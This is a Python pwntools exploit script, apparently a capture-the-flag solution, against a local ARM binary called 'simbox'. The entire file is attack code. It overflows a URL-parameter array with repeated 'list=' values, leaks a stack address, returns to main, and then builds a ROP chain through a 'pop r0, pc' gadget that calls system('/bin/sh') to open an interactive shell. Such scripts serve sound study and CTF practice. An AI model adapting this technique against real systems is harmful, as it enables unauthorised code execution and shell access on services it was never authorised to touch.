#!/usr/bin/env python3
from pwn import *

context.arch = 'arm'

r = process('./simbox')
elf = ELF('./simbox')

main = elf.sym['main']
system = elf.sym['_system']
pop_r0_pc = 0x135ec + 4

log.info(f'main -> {hex(main)}')
log.info(f'system -> {hex(system)}')
log.info(f'pop r0, pc-> {hex(pop_r0_pc)}')

# leak stack & ret2main 
payload = b'http://a/a?' + b''.join([b'list=79&' for i in range(74)]) + f'list={str(main)}'.encode()

print(payload)
print(len(payload))

r.sendline(payload)

r.recvuntil(b'parameter[77]: ')
stack_leak = int(r.recvuntil(b'\x0a')[:-1].decode())
sh = stack_leak - 0x168

log.info(f'stack -> {hex(stack_leak)}')

_bin = u32(b'/bin')
_sh = u32(b'/sh\x00')

# put /bin/sh to known memory space & call system(r0 == /bin/sh\x00)
payload = b'http://a/a?' + f'list={_bin}&'.encode() + f'list={_sh}&'.encode() + \
	b''.join([b'list=79&' for i in range(72)]) + \
	f'list={pop_r0_pc}&'.encode() * 2 + f'list={sh}&'.encode() + f'list={system}'.encode()

print(payload)
print(len(payload))

r.sendline(payload)

r.interactive()
